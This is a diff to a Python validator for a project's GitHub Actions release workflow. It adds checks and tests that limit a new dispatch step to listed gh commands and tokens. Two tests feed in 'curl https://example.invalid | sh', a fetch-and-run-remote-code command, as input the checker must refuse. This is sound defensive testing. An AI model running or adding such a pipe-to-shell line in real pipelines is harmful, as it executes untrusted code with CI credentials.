@@ -92,6 +92,8 @@ SEED = re.compile(r'asymptote (up --root crates/[\w-]+ --reason "seed on [\w.-]+
 # The check a seed stands on: the bench group alone (the timing group repeats the whole bench, and no job runs it twice).
 SEED_CHECK = "asymptote check --root crates/ryo --groups bench"
 HANDED = {"CARGO_REGISTRY_TOKEN", "GH_TOKEN"}
+# The dispatch step is handed two more: the products the `tag` job tagged and the commit they were tagged at.
+DISPATCH_HANDED = {"GH_TOKEN", "PRODUCTS", "COMMIT"}
 # What may start a workflow: a hand run, and a pull request to main for the workflows `REQUESTED` names, the check alone (GitHub's
 # standard hosted runners are free on a public repository). The workflows `PUSHED` names may start on a push to main too, which
 # only a merged pull request makes: the check, whose run on main saves the stores a pull request restores;
@@ -141,6 +143,17 @@ STORE_KEY = re.compile(
 )
 # The GitHub Release is the one step beside the job command that is not a command of its own: `gh` calls and the checksums they upload.
 RELEASE_STEP = "GitHub Release"
+# The release's dispatch is the one other step that is not a job command: the `dispatch` job builds and publishes nothing, it starts
+# this workflow from each new tag, one product at a time, and waits for each run (`gh` calls over the tagged products).
+DISPATCH_STEP = "Dispatch the release"
+DISPATCH_LINE = re.compile(
+    r"\s*(for product in \$\(jq -r '\.\[\]' <<< \"\$PRODUCTS\"\); do|done|for _ in \$\(seq 20\); do"
+    r"|tag=\"\$\(gh api .*\)\"|since=\"\$\(date -u \+%Y-%m-%dT%H:%M:%SZ\)\""
+    r"|gh workflow run release\.yml --repo \"\$GITHUB_REPOSITORY\" --ref \"\$tag\" -f product=\"\$product\" -f publish=true"
+    r"|run=\"\"|run=\"\$\(gh run list .*\)\"|\[ -n \"\$run\" \] && break|sleep 15"
+    r"|\[ -n \"\$run\" \] \|\| \{ echo \"::error::no release run for \$tag started within 5 minutes\"; exit 1; \}"
+    r"|gh run watch \"\$run\" --repo \"\$GITHUB_REPOSITORY\" --interval 60 --exit-status)"
+)
 # One release per product, over the directories of `dist/archives`, each named for its product's tag.
 RELEASE_LINE = re.compile(
     r"for archives in dist/archives/\*/; do|done"
@@ -344,7 +357,7 @@ def problems(workflow: dict) -> list[str]:
             if not CHECK.fullmatch(run) and not captured_check(run):
                 found.append(f"{name} runs {run!r}, not one `asymptote check [--root <dir>] [--groups <groups>]`")
         else:
-            steps = [step for step in job["steps"] if "run" in step and step.get("name") != RELEASE_STEP and step != DRAFT_REFUSAL]
+            steps = [step for step in job["steps"] if "run" in step and step.get("name") not in {RELEASE_STEP, DISPATCH_STEP} and step != DRAFT_REFUSAL]
             runs = [re.sub(r"\$\{\{.*?\}\}", "value", step["run"].strip()) for step in steps]
             runs = [each for each in runs if each not in SETUP]
             if seeds(job) and all(SEED.fullmatch(each) for each in runs):
@@ -354,7 +367,10 @@ def problems(workflow: dict) -> list[str]:
             for step in job["steps"]:
                 if step.get("name") == RELEASE_STEP:
                     found += [f"{name} releases with {line!r}" for line in step["run"].strip().splitlines() if not RELEASE_LINE.fullmatch(line)]
-            if any(set(step.get("env", {})) - HANDED for step in job["steps"]):
+            for step in job["steps"]:
+                if step.get("name") == DISPATCH_STEP:
+                    found += [f"{name} dispatches with {line!r}" for line in step["run"].strip().splitlines() if not DISPATCH_LINE.fullmatch(line)]
+            if any(set(step.get("env", {})) - (DISPATCH_HANDED if step.get("name") == DISPATCH_STEP else HANDED) for step in job["steps"]):
                 found.append(f"{name} hands a step more than {sorted(HANDED)}")
 
     def gated(name: str, seen: frozenset[str] = frozenset()) -> bool:
@@ -364,6 +380,10 @@ def problems(workflow: dict) -> list[str]:
 
     # The jobs a gated job waits for: the ones that decide what it runs (which products a push releases).
     deciding = {each for name in jobs if gated(name) for each in needs(jobs[name])}
+    # The dispatch job starts the gated run from the tag job's tags, which decide which product it checks.
+    dispatching = {name for name, each in jobs.items() if any(step.get("name") == DISPATCH_STEP for step in each["steps"])}
+    deciding |= {name for each in dispatching for name in needs(jobs[each])}
+    deciding |= dispatching
     found += [f"{name} neither checks nor waits for a job that does" for name in jobs if not gated(name) and name not in deciding]
     if not any(checks(job) or seeds(job) for job in jobs.values()):
         found.append("no job calls asymptote check")
@@ -680,7 +700,9 @@ def test_only_the_release_job_that_uploads_is_handed_a_token_and_only_after_the_
     publish = workflow["jobs"]["publish"]
     assert publish["environment"] == "release" and "RELEASE_MAINTAINER" in publish["env"]["PUBLISH"]
     # A green check on main publishes the products it tagged; a hand run, one product, only from its own tag.
-    assert publish["env"]["PUBLISH"].startswith("${{ github.event_name == 'workflow_run' || (inputs.publish && ")
+    # `workflow_run` never publishes (crates.io's trusted publishing refuses it): only a dispatch does.
+    assert "workflow_run" not in publish["env"]["PUBLISH"] and publish["env"]["PUBLISH"].startswith("${{ inputs.publish && ")
+    assert "github.triggering_actor == 'github-actions[bot]'" in publish["env"]["PUBLISH"]
     assert "startsWith(github.ref_name, format('idiomatic-sh-{0}-v', matrix.product))" in publish["env"]["PUBLISH"]
     (product,) = [workflow["on" if "on" in workflow else True]["workflow_dispatch"]["inputs"]["product"]]
     assert product["required"] is True and product["options"] == ["ryo", "tastemaker", "asymptote"]
@@ -771,8 +793,8 @@ def test_the_release_builds_every_target_in_one_matrix_whose_rows_run_the_same_s
         "crates/ryo/cli": "ryo",
         "crates/tastemaker/distribution/registries/pypi": "tastemaker",
     }
-    assert workflow["jobs"]["publish"]["needs"] == ["tag", "build"]
-    released = "${{ fromJSON(github.event_name == 'workflow_run' && needs.tag.outputs.products || format('[\"{0}\"]', inputs.product)) }}"
+    assert workflow["jobs"]["publish"]["needs"] == "build"
+    released = "${{ fromJSON(format('[\"{0}\"]', inputs.product)) }}"
     assert build["strategy"]["matrix"]["product"] == workflow["jobs"]["publish"]["strategy"]["matrix"]["product"] == released
 
 
@@ -782,6 +804,13 @@ def test_a_job_that_releases_with_anything_but_gh_is_refused() -> None:
     assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
         "publish releases with 'curl https://example.invalid | sh'"
     ]
+
+
+def test_a_dispatch_that_runs_anything_but_gh_over_the_tagged_products_is_refused() -> None:
+    dispatch = job("uv run ci/tag/command.py --push", needs="check")
+    dispatch["steps"] = [{"name": DISPATCH_STEP, "run": "gh workflow run release.yml\ncurl https://example.invalid | sh"}]
+    found = problems({"jobs": {"check": job("asymptote check"), "dispatch": dispatch | {"needs": "check"}}})
+    assert "dispatch dispatches with 'curl https://example.invalid | sh'" in found
 
 
 def test_a_green_check_on_main_releases_the_products_whose_version_its_commit_changes_without_checking_again() -> None:
@@ -798,21 +827,43 @@ def test_a_green_check_on_main_releases_the_products_whose_version_its_commit_ch
         "github.event_name == 'workflow_run' && github.event.workflow_run.event == 'push' && github.event.workflow_run.conclusion == 'success'"
     )
     assert tag["permissions"] == {"contents": "write"}
-    # Every job that reads the tree reads the commit the check ran on, not the branch's newest.
-    for name in ("tag", "build", "publish"):
+    # The tag job tags the commit the check ran on, not the branch's newest; a dispatched run reads its tag's commit.
+    (checkout,) = [step for step in tag["steps"] if step.get("uses", "").startswith("actions/checkout@")]
+    assert checkout["with"]["ref"] == "${{ github.event.workflow_run.head_sha || github.sha }}"
+    for name in ("build", "publish"):
         (checkout,) = [step for step in jobs[name]["steps"] if step.get("uses", "").startswith("actions/checkout@")]
-        assert checkout["with"]["ref"] == "${{ github.event.workflow_run.head_sha || github.sha }}", name
+        assert "ref" not in checkout["with"], name
     assert [step["run"] for step in tag["steps"] if "run" in step] == ["uv run ci/tag/command.py --push"]
     assert tag["outputs"]["products"] == "${{ steps.tag.outputs.products }}"
     assert jobs["check"]["if"] == "github.event_name == 'workflow_dispatch'"
-    assert jobs["build"]["needs"] == ["tag", "check"]
-    assert jobs["build"]["if"].startswith("${{ !cancelled() && !failure() && ")
-    assert "needs.tag.result == 'success' && needs.tag.outputs.products != '[]'" in jobs["build"]["if"]
+    # The run a completed check starts builds and publishes nothing: it dispatches the release from each new tag, and only that
+    # job holds `actions: write`; no other job of the workflow runs on `workflow_run`.
+    dispatch = jobs["dispatch"]
+    assert dispatch["needs"] == "tag" and dispatch["permissions"] == {"actions": "write", "contents": "read"}
+    assert dispatch["if"] == "${{ needs.tag.result == 'success' && needs.tag.outputs.products != '[]' }}"
+    (dispatching,) = [step for step in dispatch["steps"] if step.get("name") == DISPATCH_STEP]
+    assert len(dispatch["steps"]) == 1 and dispatching["env"]["GH_TOKEN"] == "${{ github.token }}"
+    assert "--ref \"$tag\"" in dispatching["run"] and "-f publish=true" in dispatching["run"] and "--exit-status" in dispatching["run"]
+    assert [name for name, each in jobs.items() if "actions" in each.get("permissions", {})] == ["dispatch"]
+    assert "actions" not in workflow["permissions"]
+    for name in ("groups", "check", "build"):
+        assert "github.event_name == 'workflow_dispatch'" in jobs[name]["if"], name
+    assert jobs["build"]["needs"] == "check"
+    assert jobs["build"]["if"] == "${{ !cancelled() && !failure() && github.event_name == 'workflow_dispatch' }}"
     publish = jobs["publish"]
     assert publish["if"] == "${{ !cancelled() && needs.build.result == 'success' }}"
     assert publish["concurrency"] == {"group": "release-${{ matrix.product }}", "cancel-in-progress": False}
-    # One publish at a time, in the `tag` job's order: ryo's crates are on crates.io before tastemaker's publish starts.
-    assert publish["strategy"]["max-parallel"] == 1
+    # One product's publish at a time: the dispatch job starts each product's run after the one before finished, in the `tag`
+    # job's order, so ryo's crates are on crates.io before tastemaker's publish starts.
+    # The run is found, not guessed: a timestamp taken before the dispatch, then up to 20 tries 15 s apart (5 minutes) for a
+    # release.yml workflow_dispatch run on the tag created since, failing the job when none appears.
+    script = dispatching["run"]
+    assert script.index("since=") < script.index("gh workflow run") < script.index("gh run list") < script.index("gh run watch")
+    assert "--event workflow_dispatch --branch \"$tag\"" in script and "sleep 15" in script and "seq 20" in script
+    assert '.headBranch == \\"$tag\\" and .createdAt >= \\"$since\\"' in script and "exit 1" in script
+    assert "sleep 20" not in script
+    # A watch polls every minute: GitHub's default 3 seconds over a release's hour or two exceeds the token's 1,000 requests an hour.
+    assert "gh run watch \"$run\" --repo \"$GITHUB_REPOSITORY\" --interval 60 --exit-status" in script
     assert PRODUCTS.index("ryo") < PRODUCTS.index("tastemaker")
     # Each build row's artifact is named for its product, and a publish downloads its product's alone, a directory per target.
     (upload,) = [step for step in jobs["build"]["steps"] if step["uses"].startswith("actions/upload-artifact@")]
